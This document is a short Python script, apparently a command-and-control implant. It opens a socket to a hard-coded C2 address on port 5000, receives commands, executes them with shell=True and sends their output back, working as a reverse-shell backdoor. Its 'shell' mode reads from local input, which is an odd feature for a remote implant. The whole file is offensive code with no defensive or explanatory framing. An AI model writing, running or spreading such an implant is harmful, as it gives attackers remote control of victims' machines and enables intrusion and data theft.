import socket
import subprocess
import os
import sys

# C2 server details
C2_IP = "172.22.89.192"
C2_PORT = 5000

# Function to establish connection with C2 server
def connect_to_c2():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((C2_IP, C2_PORT))
    return s

# Function to execute commands received from C2 server
def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True)
        return output.decode()
    except Exception as e:
        return str(e)

# Function to provide shell access to C2 server
def provide_shell_access():
    while True:
        command = input("Enter command: ")
        if command.lower() == "exit":
            break
        result = execute_command(command)
        print(result)

# Main function
def main():
    s = connect_to_c2()
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "shell":
            provide_shell_access()
        elif command.lower() == "exit":
            break
        else:
            result = execute_command(command)
            s.send(result.encode())
    s.close()

if __name__ == "__main__":
    main()
